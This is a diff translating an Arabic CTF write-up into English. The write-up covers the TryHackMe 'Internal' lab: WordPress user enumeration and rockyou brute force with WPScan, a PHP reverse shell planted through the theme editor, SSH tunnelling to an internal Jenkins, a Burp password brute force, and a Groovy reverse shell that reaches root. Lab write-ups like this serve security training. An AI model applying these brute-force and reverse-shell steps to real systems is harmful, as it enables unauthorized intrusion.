@@ -5,8 +5,7 @@
 
 ![](222b3e855f88a482c1267748f76f90e0.jpeg)
 
-### 1. نجهز ال ip
-
+### 1. Prepare the IP
 ```
 sudo nano /etc/hosts
 ```
@@ -35,7 +34,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
 Nmap done: 1 IP address (1 host up) scanned in 21.57 seconds
 ```
-لقد عرفت ان port 80 . 22 open
+I found that ports 80 and 22 are open
 ```
 
 ┌──(kali㉿kali)-[~/Downloads/THM]  
@@ -69,19 +68,16 @@ Finished
 ===============================================================
 ```
 
-هندخل علي /blog
-
+We will access /blog
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20214654.png)
 
-log in اما ننزل نلاقي
-
+When we scroll down, we find a login page
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20214916.png)
 
-بعد اما ندخل عليه ونجرب ندخل الحساب نلاقي انه بيتأكد من Username الاول فبيظهر الخطأ ده
-
+After we access it and try to log in, we see that it first verifies the username, and this error appears
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20215219.png)
 
-فهنخمن Username بادوات زي hydra , wpscan , Burp Suite بس انا هستخدم الاسهل
+So we will guess the username using tools like Hydra, WPScan, or Burp Suite, but I’ll use the easiest one
 ```
 
 ┌──(kali㉿kali)-[~/Downloads/THM]  
@@ -90,14 +86,12 @@ log in اما ننزل نلاقي
 ```
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20223843.png)
 
-ولو مشتغلش او عملت كثير وما اشتغل اعمل — no-update
-
+And if it doesn’t work, or you run it many times and it still doesn’t work, use --no-update
 ```
 wpscan --url http://internal.thm/blog/wp-login.php -e u --no-update
 
 ```
-ده بيجيب Username فهنخمن الباسورد
-
+This gives us the username, so we will guess the password
 ```
 ┌──(kali㉿kali)-[~/Downloads/THM]  
 └─$ wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
@@ -105,107 +99,91 @@ wpscan --url http://internal.thm/blog/wp-login.php -e u --no-update
 
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-08%20145053.png)
 
-واخيرا تم تسجيل الدخول
-
+And finally, we logged in successfully
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/1_l-GlDWbhwfVFEOaJ5-bEmg.png)
 
-نذهب الي The email is correct ثم الي Appearance
-
+We go to 'The email is correct' and then to 'Appearance'
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20154649.png)
 
-ثم نذهب الي Editor Theme
-
+Then we go to the Theme Editor
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155152.png)
 
-ثم الي index.php
-
+Then to index.php
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155421.png)
 
-نضع reverse-shell.php في المكان كود php
-
+We place reverse-shell.php in the PHP code section
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155529.png)
 
-وبعد اما تحط كود php المتعدل نعمل Update File
-ونروح اي صفحة بيشتغل الكودعليها بعد تجهيز nc
-
+And after you put the modified PHP code, we click Update File.
+Then we visit any page where the code runs, after setting up nc
 ```
 ┌──(kali㉿kali)-[~/Downloads/THM]
 └─$ nc -lvnp 1234
 ```
-ودي مثال علي الرابط [http://internal.thm/blog/index.php](http://internal.thm/blog/index.php) تقدر تدخل علي اي حاجه بيشتغل فيها [index.php](http://internal.thm/blog/index.php)
+Here’s an example of the URL: http://internal.thm/blog/index.php
+. You can access any page where it runs, like index.php
 
-وبعد اما نوصل لل reverse-shell ندخل علي opt
-
+And after we get the reverse shell, we go to /opt
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-09%20203614.png)
-
-ودي الياسورد و اليوزر للssh فهنسجل دخول علي ssh
+And this is the SSH username and password, so we will log in through SSH.
 ```
 ┌──(kali㉿kali)-[~/Downloads/THM]  
 └─$ ssh aubreanna@10.49.182.209
 ```
-وبعد الاتصال هنعمل
-
+And after connecting, we will do:
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20162835.png)
 ```
 aubreanna@internal:~$ cat jenkins.txt                             
 Internal Jenkins service is running on 172.17.0.2:8080    
 aubreanna@internal:~$
 ```
-ده معناه الي احني نقدر نشفل الInternal Jenkins service علي localhos port8080 ونقدر نعمل ده بssh
-
+This means we can tunnel the internal Jenkins service on localhost port 8080, and we can do that through SSH
 ```
 ┌──(kali㉿kali)-[~/Downloads/THM]  
 └─$ ssh -L 8080:localhost:8080 aubreanna@10.49.182.209
 
 ```
-وبعد كده هنشغل localhost:8080 ولو مشتغلش ادخل علي localhost منغير port
-
+And after that, we’ll run localhost:8080, and if it doesn’t work, open localhost without specifying the port
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20164101.png)
 
-وأول حاجه هتيجي في بلناه هي نبحث علي default user Jenkins وهنلاقيه `**admin**`
-
-ونحاول نخمن الباسورد من الBurp Suite بعد تشغيل متصفح ال Burp Suite هنتيع الخطوات دي مع اكيد عمل الطلب بعد الخطوة 1
-
+The first thing we’ll do there is look for the default Jenkins user, and we’ll find **admin**
+And we’ll try to guess the password using Burp Suite. After opening the Burp Suite browser, we’ll follow these steps — and of course, make the request after step 1
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20165637.png)
 
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20165919.png)
-
-في الخطوه 2 هنحدد بعد password= لان الي بعده في الطلب ده password اصلا ونفذ الخطوه 3 ثم 4 وفي 4 هتختار الwordlists و الافضل تبقى rockyou.txt لانها كبييييييييرة وقويه و المسار بتعها هو /usr/share/wordlists/rockyou.txt
-
-وتعمل
+In step 2, we will highlight what comes after password= because what follows in this request is the actual password.
+Then perform step 3 and step 4.
+In step 4, choose the wordlist — the best one is rockyou.txt because it’s very large and strong, and its path is:
+/usr/share/wordlists/rockyou.txt
+Then run the attack
 
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20170853.png)
 
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20184132.png)
 
-بعد اما تدوس علي length هتلاقي فرق كبير بين الباسورد الصح و الغلط وعمل iog in
-
+After you click on Length, you’ll notice a big difference between the correct and incorrect passwords, then log in
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204211.png)
 
-هنروح هنا وبهدين هنا
-
+We go here, and then here
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204243.png)
 
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204307.png)
 
-هتلاقي اسم لغة البرمجه [Groovy script](http://www.groovy-lang.org) ابحث علي كود لعمل reverse-shell Groovy وحطه هنه بعد التعديل
-
+You’ll find the programming language is Groovy script
+ Search for a Groovy reverse-shell code and place it there after modifying it
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204353.png)
 
-وقبل عمل Run شغل nc
-
+And before clicking Run, start nc
 ```
 ┌──(kali㉿kali)-[~/Downloads/THM]  
 └─$ nc -lvnp 9001  
 listening on [any] 9001 ...
 ```
 
-وعمل Run
-
+And click Run
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/aeb9fcd3c0ebce543c2b62204d40a4527261e507/Screenshot%202025-12-09%20205307.png)
 
-وكده حصلت علي root
-
+And with that, you obtained root
 ![](https://github.com/Red-Bugs/Internal-ctf/blob/912fb2e2911487b88137cccf52c9dc5ab801cf88/Screenshot%202025-12-09%20205307.png)
 
-ثم تهانينا علي الانتهاء
+Then, congratulations on completing it!
